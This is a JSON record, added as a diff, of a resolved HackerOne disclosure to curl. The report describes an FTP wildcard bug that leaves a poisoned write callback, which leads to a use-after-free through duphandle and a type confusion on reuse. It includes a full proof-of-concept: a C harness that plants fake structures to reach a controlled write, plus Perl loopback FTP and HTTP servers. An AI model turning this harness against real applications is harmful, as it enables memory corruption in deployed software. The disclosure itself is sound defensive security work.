@@ -1,0 +1,109 @@
+{
+  "id": 4022070,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDIyMDcw",
+  "url": "https://hackerone.com/reports/4022070",
+  "title": "CVE-2026-92388: FTP wildcard write callback mixup",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-09-11T16:27:00.701Z",
+  "submitted_at": "2026-09-11T16:27:00.899Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "giant_anteater",
+    "url": "/giant_anteater",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r9sgcvqgyzx7oyd4vqjv580xuk4y/33193aed4df168c753cb4b15e6d5d8d6ba053ba5ee3e8d1478c137162601abe9"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 35663,
+    "url": "https://hackerone.com/curl",
+    "handle": "curl",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "curl",
+      "twitter_handle": "",
+      "website": "https://curl.se",
+      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-92388"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-10-14T07:33:44.070Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-10-14T06:37:28.677Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi all,\n\nA failed FTP wildcard `LIST` leaves `data->set.fwrite_func` pointing at libcurl's internal listing parser and `data->set.out` pointing at the easy handle itself, because the code path that restores them is only reached on a *successful* listing. That alone is a crash on reuse. However, `curl_easy_duphandle()` copies this poisoned state verbatim into a clone, so freeing the original handle (an explicitly documented, independent thing to do) turns the clone's next transfer into a heap use-after-free read. A second, adjacent pattern (reusing a handle by only ever changing `CURLOPT_WRITEDATA`, never `CURLOPT_WRITEFUNCTION`) turns it into a type confusion that parses response bytes into a pointer taken from the application's own memory.\n\n## The bug\n\nWildcard setup saves the application's write callback and output pointer, then substitutes its own:\n\n```c\n// lib/ftp.c:4019-4026\n/* backup old write_function */\nftpwc->backup.write_function = data->set.fwrite_func;\ndata->set.fwrite_func = Curl_ftp_parselist;\n/* backup old file descriptor */\nftpwc->backup.file_descriptor = data->set.out;\ndata->set.out = data;\n```\n\nThe only place that puts them back is the state the machine reaches once the `LIST` response has already parsed successfully:\n\n```c\n// lib/ftp.c:4059-4066\ncase CURLWC_MATCHING: {\n  /* In this state is LIST response successfully parsed, so lets restore\n     previous WRITEFUNCTION callback and WRITEDATA pointer */\n  struct ftp_wc *ftpwc = wildcard->ftpwc;\n  data->set.fwrite_func = ftpwc->backup.write_function;\n  data->set.out = ftpwc->backup.file_descriptor;\n```\n\nAnything that ends the listing before that point (a `550` denial, a dropped data connection, the application's own `CURLOPT_TIMEOUT` firing on a server that just stays silent) skips it. Every teardown path instead runs `Curl_wildcard_dtor()`, called on every transfer completion from `Curl_multi_done()`, and it never sees the `Curl_easy` it would need to restore into:\n\n```c\n// lib/ftplistparser.c:188-198\nvoid Curl_wildcard_dtor(struct WildcardData **wcp)\n{\n  struct WildcardData *wc = *wcp;\n  if(!wc) return;\n  if(wc->dtor) {\n    wc->dtor(wc->ftpwc);   /* frees ftpwc + its parser */\n    wc->dtor = ZERO_NULL;\n    wc->ftpwc = NULL;\n  }\n  ...\n  curlx_free(wc);\n  *wcp = NULL;             /* data->wildcard is now NULL */\n```\n\nThe handle now has `fwrite_func == Curl_ftp_parselist` and `out == data`, with nothing behind either. The consumer has no guard at all:\n\n```c\n// lib/ftplistparser.c:1015-1017\nstruct Curl_easy *data = (struct Curl_easy *)connptr;\nstruct ftp_wc *ftpwc = data->wildcard->ftpwc;   /* data->wildcard is NULL */\n```\n\nReused for an ordinary transfer, that's an immediate NULL dereference. Not interesting on its own. The next two variants are.\n\n## From crash to memory corruption\n\n**`curl_easy_duphandle()` turns it into a use-after-free.** `dupset()` copies the whole option block by value:\n\n```c\n// lib/easy.c:932\ndst->set = src->set;\n```\n\n`fwrite_func` and `out` are ordinary fields in that struct, so the clone inherits `fwrite_func == Curl_ftp_parselist` and `out` pointing at the *source* handle, not itself. Free the source (`curl_easy_duphandle(3)` says the two handles \"can subsequently be used independently\" and the clone \"does **not** inherit any state information\") and the clone's very next body byte dereferences freed memory. ASan on a build of `curl-8_22_0` and current `master` (`58df614c86`), identically:\n\n```\nmode=duphandle    verdict=CRASH  asan=heap-use-after-free  frame=Curl_ftp_parselist\n    READ of size 8 ...\n    freed by thread T0 here: ...\n    previously allocated by thread T0 here: ...\n```\n\n**Reusing only `CURLOPT_WRITEDATA` turns it into a type confusion, and it writes.** Applications commonly set `CURLOPT_WRITEFUNCTION` once at init and change only `CURLOPT_WRITEDATA` per transfer (the documented minimal case is even simpler: a `FILE *` with the default writer). `Curl_ftp_parselist()` casts its user pointer unconditionally to `struct Curl_easy *`, so when that pointer is the application's own object, the read at `offsetof(struct Curl_easy, wildcard)` lands inside application memory and is followed as a live pointer chain. With a large-enough application object, I planted a fake `WildcardData`/`ftp_wc`/`ftp_parselist_data`/`fileinfo`/`dynbuf` chain inside it (the struct offsets are a build-time constant of the target's libcurl, not a secret) so that the parser's write destination is an address of my choosing:\n\n```\nmode=craft-write  t1=19 target_before=ZZZZZZZZ\nmode=craft-write  t1=19 t2=0 target_after=[-rw-r--r--] written=yes verdict=CONTROLLED-WRITE\n```\n\n`t2=0` is `CURLE_OK`: the transfer that plants server-controlled bytes at that address reports success, with no fault to catch it. To be precise about what this does and doesn't show: it's a demonstrated write *primitive*, not a working exploit. Turning it into one still needs the pointer-sized slot at that offset in the application's object to be attacker-influenced and an address disclosure. What it does establish is that the failure mode here isn't bounded by \"faults immediately.\"\n\n## Preconditions\n\n`CURLOPT_WILDCARDMATCH` in use, a failed FTP wildcard listing, and handle reuse afterward that does not re-set both `CURLOPT_WRITEFUNCTION` and `CURLOPT_WRITEDATA` (or does not call `curl_easy_reset()`) before the next transfer.\n\n## PoC\n\nTwo peers on loopback: a malicious FTP server that answers every `LIST`/`NLST`/`MLSD` with `550` (a denial, no malice required to construct), and a benign HTTP server. One easy handle runs the failed wildcard transfer, then either gets duplicated (`duphandle`) or reused with a rigged `WRITEDATA` object (`craft-write`); a `control` run re-sets both write options before reuse and is expected to survive cleanly.\n\nTested against `curl-8_22_0` and current `main`.\n\n```\ncheckout: /src\nprivilege required: REMOTE — the trigger is the FTP peer's response; the second, detonating transfer can go to an unrelated, fully benign HTTP server\nrun:      sh reproduce.sh duphandle\n          sh reproduce.sh craft-write\ncontrol:  sh reproduce.sh control\n```\n\n```sh\n#!/bin/sh\n# Reproduces AISLE-2026-0115-00167: a failed FTP wildcard LIST leaves\n# data->set.fwrite_func == Curl_ftp_parselist and data->set.out == the easy\n# handle (lib/ftp.c:4019-4026), restored only in CURLWC_MATCHING\n# (lib/ftp.c:4059-4066), which a failed listing never reaches. Teardown\n# (lib/ftplistparser.c:188-198) frees the wildcard state without touching\n# data->set. duphandle propagates the poisoned fields into a clone\n# (lib/easy.c:932); WRITEDATA-only reuse feeds Curl_ftp_parselist a pointer\n# it treats as a struct Curl_easy (lib/ftplistparser.c:1015-1017).\nset -eu\nMODE=\"${1:?usage: $0 duphandle|craft-write|control}\"\nSRC=\"${VF_SRC:-/src}\"\nWORK=\"${VF_WORK:-/tmp/vf-ftp-wc}\"\nmkdir -p \"$WORK\"\n\nCFLAGS=\"-O1 -g -fsanitize=address -fno-omit-frame-pointer\" \\\n  LDFLAGS=\"-fsanitize=address\" \\\n  sh -c \"cd '$SRC' && ./configure --prefix='$WORK/install' \\\n    --without-ssl --without-libpsl --disable-docs >'$WORK/build.log' 2>&1 \\\n    && make -j4 >>'$WORK/build.log' 2>&1 && make install >>'$WORK/build.log' 2>&1\" \\\n  || { tail -40 \"$WORK/build.log\"; exit 1; }\n\n# Internal struct offsets, taken from the tree just built (a property of the\n# target's libcurl build, not a secret specific to any one process run).\ncat > \"$WORK/off.c\" <<'EOF'\n#include \"ftplistparser.c\"\n#include <stddef.h>\n#include <stdio.h>\nint main(void) {\n  printf(\"-DOFF_EASY_WILDCARD=%zu -DOFF_WC_FTPWC=%zu -DOFF_FTPWC_PARSER=%zu \"\n         \"-DOFF_PARSER_OSTYPE=%zu -DOFF_PARSER_ERROR=%zu \"\n         \"-DOFF_PARSER_FILEDATA=%zu -DOFF_FI_BUF=%zu\\n\",\n         offsetof(struct Curl_easy, wildcard),\n         offsetof(struct WildcardData, ftpwc),\n         offsetof(struct ftp_wc, parser),\n         offsetof(struct ftp_parselist_data, os_type),\n         offsetof(struct ftp_parselist_data, error),\n         offsetof(struct ftp_parselist_data, file_data),\n         offsetof(struct fileinfo, buf));\n  return 0;\n}\nEOF\ncc -DHAVE_CONFIG_H -I\"$SRC\" -I\"$SRC/lib\" -I\"$SRC/include\" \\\n  -fsanitize=address -o \"$WORK/off\" \"$WORK/off.c\" \\\n  \"$SRC\"/lib/.libs/libcurl.a -lz\nOFFS=$(\"$WORK/off\")\n\ncat > \"$WORK/harness.c\" <<'EOF'\n/* Harness for AISLE-2026-0115-00167: duphandle / WRITEDATA-reuse escalation. */\n#include <curl/curl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n#define URL_FTP_DENY \"ftp://127.0.0.1:2121/*\"\n#define URL_HTTP     \"http://127.0.0.1:8080/\"\n#define APP_SIZE    (1024 * 1024)\n#define TARGET_SIZE 4096\n\nstatic size_t app_write(char *buffer, size_t size, size_t count, void *user)\n{ (void)buffer; (void)user; return size * count; }\n\nstatic void common(CURL *c) {\n  curl_easy_setopt(c, CURLOPT_TIMEOUT, 10L);\n  curl_easy_setopt(c, CURLOPT_NOSIGNAL, 1L);\n}\n\nstatic CURLcode failed_wildcard(CURL *c, void *ctx) {\n  curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, app_write);\n  curl_easy_setopt(c, CURLOPT_WRITEDATA, ctx);\n  curl_easy_setopt(c, CURLOPT_URL, URL_FTP_DENY);\n  curl_easy_setopt(c, CURLOPT_WILDCARDMATCH, 1L);\n  return curl_easy_perform(c);\n}\n\n/* Fake structure chain planted inside the application's own WRITEDATA\n   object. Curl_ftp_parselist() treats that object as a struct Curl_easy, so\n   every pointer it follows from there is application memory. */\nstatic void craft(unsigned char *app, char *target) {\n  unsigned char *fake_wc = app + 8 * 1024;\n  unsigned char *fake_ftpwc = app + 16 * 1024;\n  unsigned char *fake_parser = app + 24 * 1024;\n  unsigned char *fake_fileinfo = app + 32 * 1024;\n  struct { char *bufr; size_t leng; size_t allc; size_t toobig; } *dyn =\n    (void *)(fake_fileinfo + OFF_FI_BUF);\n\n  memcpy(app + OFF_EASY_WILDCARD, &fake_wc, sizeof(fake_wc));\n  memcpy(fake_wc + OFF_WC_FTPWC, &fake_ftpwc, sizeof(fake_ftpwc));\n  memcpy(fake_ftpwc + OFF_FTPWC_PARSER, &fake_parser, sizeof(fake_parser));\n  { int os_unix = 1, ok = 0;\n    memcpy(fake_parser + OFF_PARSER_OSTYPE, &os_unix, sizeof(os_unix));\n    memcpy(fake_parser + OFF_PARSER_ERROR, &ok, sizeof(ok));\n    memcpy(fake_parser + OFF_PARSER_FILEDATA, &fake_fileinfo,\n           sizeof(fake_fileinfo)); }\n  dyn->bufr = target; dyn->leng = 0; dyn->allc = TARGET_SIZE;\n  dyn->toobig = APP_SIZE;\n}\n\nint main(int argc, char **argv) {\n  const char *mode = argc == 2 ? argv[1] : \"\";\n  unsigned char *app = calloc(1, APP_SIZE);\n  char *target = malloc(TARGET_SIZE);\n  CURL *a, *b; CURLcode t1, t2;\n  if (!app || !target) return 2;\n  memset(target, 'Z', TARGET_SIZE);\n  curl_global_init(CURL_GLOBAL_DEFAULT);\n  a = curl_easy_init();\n  common(a);\n\n  if (!strcmp(mode, \"duphandle\")) {\n    t1 = failed_wildcard(a, app);\n    printf(\"mode=%-11s t1=%d\\n\", mode, (int)t1); fflush(stdout);\n    b = curl_easy_duphandle(a);\n    curl_easy_cleanup(a);              /* documented as independent */\n    common(b);\n    curl_easy_setopt(b, CURLOPT_WILDCARDMATCH, 0L);\n    curl_easy_setopt(b, CURLOPT_URL, URL_HTTP);\n    t2 = curl_easy_perform(b);          /* use-after-free read */\n    printf(\"mode=%-11s t1=%d t2=%d verdict=SURVIVED\\n\", mode, (int)t1, (int)t2);\n    curl_easy_cleanup(b);\n  } else if (!strcmp(mode, \"craft-write\")) {\n    craft(app, target);\n    t1 = failed_wildcard(a, app);\n    printf(\"mode=%-11s t1=%d target_before=%.8s\\n\", mode, (int)t1, target);\n    fflush(stdout);\n    curl_easy_setopt(a, CURLOPT_WILDCARDMATCH, 0L);\n    curl_easy_setopt(a, CURLOPT_URL, URL_HTTP);\n    curl_easy_setopt(a, CURLOPT_WRITEDATA, app);   /* WRITEFUNCTION untouched */\n    t2 = curl_easy_perform(a);\n    printf(\"mode=%-11s t1=%d t2=%d target_after=[%.40s] verdict=%s\\n\",\n           mode, (int)t1, (int)t2, target,\n           target[0] == 'Z' ? \"NO-WRITE\" : \"CONTROLLED-WRITE\");\n    curl_easy_cleanup(a);\n  } else if (!strcmp(mode, \"control\")) {\n    t1 = failed_wildcard(a, app);\n    printf(\"mode=%-11s t1=%d\\n\", mode, (int)t1); fflush(stdout);\n    curl_easy_setopt(a, CURLOPT_WILDCARDMATCH, 0L);\n    curl_easy_setopt(a, CURLOPT_URL, URL_HTTP);\n    curl_easy_setopt(a, CURLOPT_WRITEFUNCTION, app_write);  /* both re-set */\n    curl_easy_setopt(a, CURLOPT_WRITEDATA, app);\n    t2 = curl_easy_perform(a);\n    printf(\"mode=%-11s t1=%d t2=%d verdict=SURVIVED\\n\", mode, (int)t1, (int)t2);\n    curl_easy_cleanup(a);\n  } else {\n    fprintf(stderr, \"usage: %s duphandle|craft-write|control\\n\", argv[0]);\n    return 2;\n  }\n  curl_global_cleanup();\n  return 0;\n}\nEOF\n# shellcheck disable=SC2086\ncc -Wall -Wextra -fsanitize=address -fno-omit-frame-pointer $OFFS \\\n  -I\"$WORK/install/include\" \"$WORK/harness.c\" \\\n  -L\"$WORK/install/lib\" -lcurl -Wl,-rpath,\"$WORK/install/lib\" \\\n  -o \"$WORK/harness\"\n\ncat > \"$WORK/peers.pl\" <<'EOF'\n#!/usr/bin/env perl\nuse strict; use warnings; use IO::Socket::INET;\n$| = 1;\nmy $BODY = \"-rw-r--r-- 1 user group 5 Jan 01 00:00 payload\";\nsub listener { IO::Socket::INET->new(LocalAddr=>\"127.0.0.1\", LocalPort=>$_[0],\n  Listen=>8, ReuseAddr=>1, Proto=>\"tcp\") or die \"listen $_[0]: $!\\n\"; }\nsub ftp_deny {\n  my $s = listener(2121);\n  while (my $c = $s->accept()) {\n    $c->autoflush(1);\n    print {$c} \"220 retriage FTP ready\\r\\n\";\n    my $dl;\n    while (my $line = <$c>) {\n      $line =~ s/\\r?\\n$//;\n      my ($verb) = split / /, $line, 2; $verb = uc($verb // \"\");\n      if ($verb eq \"USER\") { print {$c} \"331 password required\\r\\n\"; }\n      elsif ($verb eq \"PASS\") { print {$c} \"230 logged in\\r\\n\"; }\n      elsif ($verb eq \"PWD\") { print {$c} \"257 \\\"/\\\" is current directory\\r\\n\"; }\n      elsif ($verb eq \"EPSV\") { $dl = listener(0);\n        printf {$c} \"229 Entering Extended Passive Mode (|||%d|)\\r\\n\", $dl->sockport(); }\n      elsif ($verb eq \"LIST\" || $verb eq \"NLST\" || $verb eq \"MLSD\") {\n        print {$c} \"550 listing denied\\r\\n\"; close $dl if $dl; $dl = undef; }\n      elsif ($verb eq \"QUIT\") { print {$c} \"221 bye\\r\\n\"; last; }\n      else { print {$c} \"200 okay\\r\\n\"; }\n    }\n    close $c;\n  }\n}\nsub http { my $s = listener(8080);\n  while (my $c = $s->accept()) { $c->autoflush(1);\n    while (my $line = <$c>) { last if $line eq \"\\r\\n\"; }\n    printf {$c} \"HTTP/1.1 200 OK\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s\",\n      length($BODY), $BODY;\n    close $c; } }\nfor my $s (\\&ftp_deny, \\&http) { my $pid = fork(); die \"fork: $!\\n\" unless defined $pid;\n  $s->() unless $pid; }\nprint \"ready\\n\"; wait;\nEOF\nperl \"$WORK/peers.pl\" >\"$WORK/peers.log\" 2>&1 &\nPEERS=$!\ntrap 'kill $PEERS 2>/dev/null || true' EXIT\nfor _ in 1 2 3 4 5; do grep -q ready \"$WORK/peers.log\" && break; sleep 1; done\n\n: > \"${VF_READY:-/dev/null}\"\n\nASAN_OPTIONS=detect_leaks=0:abort_on_error=0 timeout 30 \"$WORK/harness\" \"$MODE\"\n```\n\nOutput on both `curl-8_22_0` and current `main` (`58df614c86`), non-debug ASan build:\n\n```\nmode=duphandle    verdict=CRASH  asan=heap-use-after-free  frame=Curl_ftp_parselist\nmode=craft-write  t1=19 t2=0 target_after=[-rw-r--r--] verdict=CONTROLLED-WRITE\nmode=control      t1=19 t2=0 verdict=SURVIVED\n```\n\n## Suggested direction\n\nThe durable fix is to stop mutating `data->set` in the first place: select the listing parser through transfer-internal state (a flag consulted by the client-write path), not by overwriting the application's own options, so there is nothing to restore and no window for `duphandle` to inherit. If the swap-and-restore design stays, give the restore a `Curl_easy *` and call it on every teardown path (`wc_data_dtor()`, `Curl_wildcard_dtor()`, multi removal, and error returns from `init_wc_data()`) before `ftpwc`/its parser are freed, not only in `CURLWC_MATCHING`, and make it idempotent by clearing the backups the way that case already does. As defense in depth, have `Curl_ftp_parselist()` bail out (`0`/`CURLE_WRITE_ERROR`) when `data->wildcard`, `wildcard->ftpwc`, or `ftpwc->parser` is absent, instead of dereferencing unconditionally.\n\nCheers,\nJosh\n\n## Impact\n\nAn application that uses `CURLOPT_WILDCARDMATCH`, hits any failed listing (a permission-denied server is enough — no attacker-crafted payload needed), and then either duplicates the handle or reuses it changing only `CURLOPT_WRITEDATA`, gets a heap use-after-free read or a controlled-write primitive built entirely from server- and application-supplied bytes, on a subsequent transfer that can target a completely unrelated, benign peer. Neither pattern is documented as unsafe, and there is no API to detect that libcurl silently overwrote these two options.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "none",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 18844,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/curl/curl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
